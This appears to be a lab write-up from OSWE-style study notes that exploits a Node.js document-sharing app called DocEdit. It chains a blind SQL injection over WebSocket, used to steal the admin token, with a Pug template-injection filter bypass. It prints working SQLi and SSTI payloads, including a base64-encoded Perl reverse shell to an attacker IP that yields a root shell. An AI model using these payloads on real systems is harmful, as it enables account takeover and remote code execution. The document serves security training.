# DocEdit SQLI Authentication Bypass and SSTI RCE
DocEdit is a Node.js application that uses MySQL as its database management system (DBMS) and runs on Linux. It allows you to create documents and share them with other users.

The application leverages WebSocket technology for real-time operations, including reading, creating, editing, and deleting documents, as well as updating user profiles. WebSocket communication is integral to nearly all interactive features.

It utilizes the third-party library [Socket.IO](https://socket.io/), which provides low-latency, bidirectional, and event-driven communication between clients and servers.
## Authentication Bypass — SQLI
### Source Code Analysis 
In `/docedit/server-src/controllers/userController.js`, the application defines several functions for user management. One function of particular concern is `searchByEmail`:
```javascript
...
const searchByEmail = async (email) =>  {
	try {
		const user = await models.sequelize.query("SELECT * FROM `Users` WHERE email LIKE '" + email + "%'", { type: QueryTypes.SELECT });
		if (user.length > 0){
			return true
		}else{
			return false
		}
	  } catch (err) {
		throw new Error("Something went wrong during the query")
	  }
}
...
```
This function is invoked when a user is tagged by their email address in a document to verify the existence of that email. This function directly concatenates unsanitized user input (`email`) into an SQL query string executed by `Sequelize`. Such practice is dangerous because it exposes the application to SQL injection vulnerabilities, allowing attackers to manipulate the query to access, modify, or delete sensitive data.

Now, let’s search the entire source code for occurrences of the `searchByEmail` function to identify where it is called, so we can determine potential entry points for triggering the SQL injection vulnerability.

We find one occurrence in `/docedit/server-src/routes/ws.js`:

```javascript
...
socket.on('checkEmail', async function(data) {
  userController.searchByEmail(data.email)
    .then((found) => {
      socket.emit('emailFound', found);
    })
    .catch((error) => {
      socket.emit('message', { type: "error", message: error.message });
    });
});
...
```

The `/routes/ws.js` file defines the available WebSocket events and their expected parameters.

In this case, the `checkEmail` WebSocket event passes the user-supplied `email` directly to the `searchByEmail` function without any input sanitization or validation. This confirms our suspicion that the SQL injection vulnerability is exploitable through this WebSocket function.

### Triggering the SQL Injection Vulnerabililty
First, we need to create an account so that we can interact with the WebSocket endpoint as an authenticated user. Upon registration, the server provides a `token` that must be included in all subsequent WebSocket requests.

Our goal is to craft a valid WebSocket request that triggers the `checkEmail` event, which internally calls the vulnerable `searchByEmail` function.

A normal request might look like this:

```json
42["checkEmail", {"email": "john@doe.ltd", "token": "lAIZ2VeyO8JQ8tfO5YBRAQMesNpz6i3Y"}]
```

If the supplied email exists in the database, the server responds with:

```json
42["emailFound", true]
```

If the email does not exist, the server responds with:

```json
42["emailFound", false]
```

To confirm the SQL injection vulnerability, we can send the following request:

```json
42["checkEmail", {"email": "' or true-- -", "token": "lAIZ2VeyO8JQ8tfO5YBRAQMesNpz6i3Y"}]
```

The server responds with:

```json
42["emailFound", true]
```

This indicates that the query condition was manipulated to always evaluate as true, confirming the presence of a **Boolean-based SQL injection**.

We can further verify the injection by causing a time delay:

```json
42["checkEmail", {"email": "' or sleep(2)-- -", "token": "lAIZ2VeyO8JQ8tfO5YBRAQMesNpz6i3Y"}]
```

The server’s responds in approximately two seconds, this confirms that we can execute time-based payloads, demonstrating control over the underlying SQL query execution.
### Identifying the attack vector
To successfully exploit the SQL injection vulnerability, we first need to gather information about the underlying database structure, including the existing tables and the locations where sensitive or exploitable data might reside.

We can achieve this by logging into the database using the credentials stored in `/docedit/.env`:

```
MYSQL_DATABASE=docedit
MYSQL_USER=docedit
MYSQL_PASSWORD=80c2680bb8b8113d57147c25bd371f2b7cffcfa22a9456d444f97ad6f92b70ce
MYSQL_ROOT_PASSWORD=71bfaf52714a338c3bc34add6d1d12716bed0f1d76cb2602d119aa425307feb8
MYSQL_HOST=localhost
DOMAIN=docedit.tld
DEBUG=false
```

We connect using the following command:

```bash
mysql -h localhost -u docedit -p80c2680bb8b8113d57147c25bd371f2b7cffcfa22a9456d444f97ad6f92b70ce docedit
```

After logging in, we begin our enumeration:

```bash
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| docedit            |
| information_schema |
+--------------------+
2 rows in set (0.00 sec)
```

The target application uses a database named `docedit`. Let’s list the tables it contains:

```bash
mysql> use docedit;
Database changed
mysql> show tables;
+-------------------+
| Tables_in_docedit |
+-------------------+
| AuthTokens        |
| DocumentTags      |
| Documents         |
| Pages             |
| Plugins           |
| Users             |
+-------------------+
6 rows in set (0.00 sec)
```

The `Users` table is of particular interest as it may store administrative account credentials:

```bash
mysql> select * from Users;
+----+-----------+----------+-------+-----------------+--------------------------------------------------------------+---------------------+---------------------+
| id | firstName | lastName | admin | email           | password                                                     | createdAt           | updatedAt           |
+----+-----------+----------+-------+-----------------+--------------------------------------------------------------+---------------------+---------------------+
|  1 | admin     | admin    |     1 | admin@admin.com | $2b$12$EOQ1RWhDkNfdT8DzUaQ1X.4aFcFo0.qEW5c1Z99nEiBPYDIL3YLAe | 2020-04-03 20:44:46 | 2020-04-03 20:44:46 |
+----+-----------+----------+-------+-----------------+--------------------------------------------------------------+---------------------+---------------------+
1 row in set (0.00 sec)
```

The password is stored as a bcrypt hash, which would require cracking before use.

Another table of interest is `AuthTokens`, which may store session tokens for user authentication:

```bash
mysql> select * from AuthTokens;
+----+----------------------------------+---------------------+---------------------+--------+
| id | token                            | createdAt           | updatedAt           | UserId |
+----+----------------------------------+---------------------+---------------------+--------+
|  1 | bnrftMbdOE6ZBfxP84a95A6qGoyjKXM1 | 2024-12-04 01:39:21 | 2024-12-04 01:39:21 |      1 |
+----+----------------------------------+---------------------+---------------------+--------+
1 row in set (0.00 sec)
```

As suspected, the `AuthTokens` table stores the administrator’s authentication token in plaintext. Using the SQL injection vulnerability identified earlier, we can exfiltrate this token and hijack the administrator’s session, thereby fully compromising the account and gaining administrative access to the application.

### Exploiting the SQL Injection Vulnerability
As determined earlier, the administrator’s account `token` is **33 characters** long. 

*Note: if you wanted to guess the token lengh blindly use:*
```json
42["checkEmail",{"token":"<valid_normal_user_token>","email":"hmm' OR (length((select token from AuthTokens where UserId = 1 limit 0,1))) = <number> #"}]
```

We can leverage the SQL injection vulnerability to extract it character-by-character using a query such as:
```json
42["checkEmail", {"email": "asf' OR (SELECT ASCII(SUBSTRING((SELECT token FROM AuthTokens WHERE UserId=1), 1, 1)) = 57)#", "token": "<valid_session_token>"}]
```

By iterating over each character position in the `token` column and checking the ASCII value, we can reconstruct the token. A successful guess can be identified by observing the WebSocket response. For example, the following response indicates that the extracted character matched the guessed value:

```json
42["emailFound", true]
```
This can be exploited to extract the token column from the `AuthTokens` table for any user. The tricky part is dealing with the WebSocket connection. The websockets are Asynchronous. This means that before sending the next blind SQLi query, you must ensure that the previous one has returned. However, once this is accounted for, the blind SQLi via WebSockets will typically run much faster.

To accomplish this, we will use this script: [sqli_hij_admin_token.py](https://github.com/0xNayel/OSWE-AWAE-Notes/blob/main/ExtraMile/DocEdit%20Application/sqli_hij_admin_token.py) to exfiltrate the admin's token.

Script output:
```bash
┌──(kali㉿kali)-[~/docedit]
└─$ /bin/python /home/kali/docedit/sqli_hij_admin_token.py 192.168.174.237                    
[+] Account john@doe.ltd:Password!123 has been successfully created.
[+] User Registered Successfully
[*] Logging you in...
[+] Login successful. John Doe's token: 4DGUOZEhObAVKJyTiS4UeLzv0qaEdS33
[+] Starting SQLi
9OKjr62uH17Rr6cGtqf2kBSHyW4JU5jw
[+] Admin's token: 9OKjr62uH17Rr6cGtqf2kBSHyW4JU5jw
[-] Disconnected from server
               
┌──(kali㉿kali)-[~/docedit]
└─$ 
```
*Note: The extracted token differs from the one stored in the database we examined earlier. This is because the database we accessed belongs to the debug VM, whereas the target of our attack is the victim VM, which uses a separate database instance.*

Using the browser’s **Developer Tools**, navigate to **Storage** → **Local Storage**, and replace the existing normal user token with the extracted administrator token:

```json
{"firstName": "admin", "lastName": "admin", "token": "9OKjr62uH17Rr6cGtqf2kBSHyW4JU5jw"}
```

This will effectively authenticate the session as the administrator, granting full access to administrative functionalities within the application.
## RCE — Node.js Pug Templating Engine SSTI
After authenticating as the administrator—thereby gaining full access to the application’s administrative functionalities—we can further investigate the newly available features to identify potential vulnerabilities that could be exploited to achieve Remote Code Execution (RCE) on the target machine.
### Finding the SSTI
While exploring the target application, we notice that clicking **`Account`** reveals a new option in the toggle list called **`Edit Server Settings`**.

After examining this function, we found that it is used to render the welcome message displayed to the user upon logging in.

But, what is the templating engine being used by the application?
### Identifying the Templating Engine
Navigating to `/docedit/app.js`, at the beginning of the file, we find:
```javascript
...
// view engine setup
app.set('views', path.join(__dirname, 'server-src/views'));
app.set('view engine', 'pug');
...
```
This confirms that the target application uses Pug as its templating engine.
### Triggering the SSTI in Pug
An online search provides us with a list of payloads for exploiting **Server-Side Template Injection (SSTI)** in Pug. For example, [HackTricks](https://hacktricks.boitatech.com.br/pentesting-web/ssti-server-side-template-injection#pugjs-nodejs) lists:

```javascript
#{7*7} = 49

#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('id')}()}
```

We start with the simple test payload `#{7*7}` to verify the vulnerability.

By editing the welcome message body to include `#{7*7}` and clicking **Update**, then navigating to the home page, we see:

```
Home

Welcome to Home
<49>
```

This confirms the presence of an SSTI vulnerability in the Pug template. We can now escalate this attack to achieve Remote Code Execution (RCE).
### Leveraging to RCE
If we attempt to use the following payload:

```javascript
#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('id')}()}
```

and update the message, the server responds with:

```
Error!
Keyword is not allowed
```

This suggests that the application implements some form of user input validation to block certain keywords, preventing us from executing our intended payload.

To investigate further, we can search the entire codebase for the error message `"Keyword is not allowed"` to locate the function responsible for this validation and analyze it for possible bypass techniques.

This code snippet from `/docedit/server-src/controllers/pageController.js`:
```javascript
...
const saveHome = async (content) =>  {
	const blacklist = ["- ","require", "child_process"];

	if(blacklist.some(v => content.includes(v))){
		throw new Error("Keyword is not allowed")
	}
	const page = await models.Pages.findOne(
		{ where: { location: 'home' } }
	);

	if(!page){
		await models.Pages.create({
			location: 'home',
			content: content,
		  }).then(function(data) {
			return data
		  }).catch(function(err) {
			throw new Error("Something went wrong saving your page");
		});
	}else{
		page.content = content;
		page.save();
		return page
	}

}
...
```
This code checks if the `content` contains certain blacklisted keywords like `"- "`, `"require"`, or `"child_process"` and rejects it if found; otherwise, it either creates or updates the "home" page in the database with the provided content.

#### SSTI Filter Bypass — RCE
After an online research, we found an [alternative payload](https://gist.github.com/Jasemalsadi/2862619f21453e0a6ba2462f9613b49f):
```javascript
#{spawn_sync = this.process.binding('spawn_sync')}
#{ normalizeSpawnArguments = function(c,b,a){if(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined&&(a={}),a=Object.assign({},a),a.shell){const g=[c].concat(b).join(' ');typeof a.shell==='string'?c=a.shell:c='/bin/sh',b=['-c',g];}typeof a.argv0==='string'?b.unshift(a.argv0):b.unshift(c);var d=a.env||process.env;var e=[];for(var f in d)e.push(f+'='+d[f]);return{file:c,args:b,options:a,envPairs:e};}}
#{spawnSync = function(){var d=normalizeSpawnArguments.apply(null,arguments);var a=d.options;var c;if(a.file=d.file,a.args=d.args,a.envPairs=d.envPairs,a.stdio=[{type:'pipe',readable:!0,writable:!1},{type:'pipe',readable:!1,writable:!0},{type:'pipe',readable:!1,writable:!0}],a.input){var g=a.stdio[0]=util._extend({},a.stdio[0]);g.input=a.input;}for(c=0;c<a.stdio.length;c++){var e=a.stdio[c]&&a.stdio[c].input;if(e!=null){var f=a.stdio[c]=util._extend({},a.stdio[c]);isUint8Array(e)?f.input=e:f.input=Buffer.from(e,a.encoding);}}console.log(a);var b=spawn_sync.spawn(a);if(b.output&&a.encoding&&a.encoding!=='buffer')for(c=0;c<b.output.length;c++){if(!b.output[c])continue;b.output[c]=b.output[c].toString(a.encoding);}return b.stdout=b.output&&b.output[1],b.stderr=b.output&&b.output[2],b.error&&(b.error= b.error + 'spawnSync '+d.file,b.error.path=d.file,b.error.spawnargs=d.args.slice(1)),b;}}
#{payload='dXNlIFNvY2tldDskaT0iMTkyLjE2OC40NS4yMDUiOyRwPTEzMzc7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307'}
#{resp=spawnSync('perl',['-e',(new Buffer(payload, 'base64')).toString('ascii')])}
```
After modifying the base64 encoded value, supplying the attacker IP address and listener port, let's setup our netcat listener and try to save and render this new payload.

```bash
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 1337
listening on [any] 1337 ...
connect to [192.168.45.205] from (UNKNOWN) [192.168.174.237] 53734
sh: cannot set terminal process group (1492): Inappropriate ioctl for device
sh: no job control in this shell
sh-4.4#
```
**Automation Script:** [rce_script.py](https://github.com/0xNayel/OSWE-AWAE-Notes/blob/main/ExtraMile/DocEdit%20Application/rce_script.py) 
